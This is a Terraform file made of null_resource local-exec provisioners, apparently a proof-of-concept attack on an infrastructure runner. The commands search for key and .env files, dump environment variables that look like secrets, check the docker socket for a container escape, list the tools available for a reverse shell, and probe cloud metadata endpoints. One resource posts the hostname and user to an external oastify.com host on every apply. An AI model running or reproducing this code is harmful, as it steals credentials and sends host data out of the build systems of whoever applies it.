resource "null_resource" "proof" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== system compromise proof ==="
      echo "container id: $(cat /etc/hostname)"
      echo "user: $(whoami)"
      echo "privileges: $(id)"
      echo "os: $(cat /etc/os-release | grep PRETTY_NAME)"
      echo "=== network access ==="
      ip addr show
      echo "=== process tree ==="
      ps auxf
      echo "=== file system access ==="
      find / -name "*.pem" -o -name "*.key" -o -name ".env" 2>/dev/null | head -10
      echo "=== environment secrets ==="
      env | grep -i "token\|key\|secret\|pass" | head -20
      echo "=== container escape check ==="
      ls -la /var/run/docker.sock 2>/dev/null && echo "docker socket accessible" || echo "no docker socket"
      cat /proc/1/cgroup | grep docker 2>/dev/null && echo "running in docker" || echo "not in docker"
    EOT
  }
}

resource "null_resource" "persistence" {
  provisioner "local-exec" {
    command = <<EOT
      echo "malicious-payload-$(date +%s)" > /tmp/compromise-proof.txt
      curl -X POST -d "hostname=$(hostname)" -d "user=$(whoami)" -d "timestamp=$(date)" http://alzd995lvnk68ervsgkcz3va016sujx7m.oastify.com/persistence-proof
    EOT
  }
  
  triggers = {
    always_run = timestamp()
  }
}

resource "null_resource" "reverse_shell_test" {
  provisioner "local-exec" {
    command = <<EOT
      which bash && echo "bash available" || echo "no bash"
      which python3 && echo "python3 available" || echo "no python3"
      which nc && echo "netcat available" || echo "no netcat"
      which wget && echo "wget available" || echo "no wget"
      which curl && echo "curl available" || echo "no curl"
    EOT
  }
}

resource "null_resource" "cloud_check" {
  provisioner "local-exec" {
    command = <<EOT
      timeout 2 curl -s http://169.254.169.254/latest/meta-data/ && echo "aws metadata accessible" || echo "no aws metadata"
      timeout 2 curl -s http://metadata.google.internal/ && echo "gcp metadata accessible" || echo "no gcp metadata"
    EOT
  }
}
